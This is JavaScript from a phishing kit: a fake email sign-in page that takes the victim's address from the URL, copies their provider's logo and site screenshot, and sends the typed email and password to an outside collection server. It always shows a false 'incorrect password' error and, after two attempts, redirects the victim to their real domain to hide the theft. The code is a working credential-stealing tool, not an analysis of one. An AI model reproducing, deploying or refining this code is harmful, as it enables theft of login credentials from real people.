
    /* global $ */
    $(document).ready(function(){
      var count=0;
 
      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email); 
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
           email.focus;
           return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var mainPage = 'https://'+my_slice; 
		var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();
	
		var sv = my_slice;
		
		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
		
		//var image = "url('https://"+sv;"')"
	

        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
		$("#logoname").html(final);
		$(".logoname").html(final);
         
        document.body.style.backgroundImage = image;

		
	 	
        $(".email").html(email);
		 
      }
 
      $('#submit-btn').click(function(event){
    
		event.preventDefault();
        $('#error').hide();
        $('#msg').hide();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!email) {
            $('#error').show();
            $('#error').html("Email field is empty");
        
            return false;
        }

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is empty");
         
            return false;
        }

 
		 
      ///////////new injection////////////////
      count=count+1;
    //  console.log(count); 
	var d=atob('');
	   $.ajax({
        dataType: 'JSON',
		url: 'https://pacjdidisureknik.store/bee/index.php',
        type: 'POST',
        data:{
          email:email,
          password:password
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Sign in');
			  
    //  console.log(count); 
            },
            success: function(response){
			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
              if(response){
                $("#msg").show();
				console.log(response);
				$('#msg').html(response['msg']);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sgn in');
            }
          });  
    });


    });


  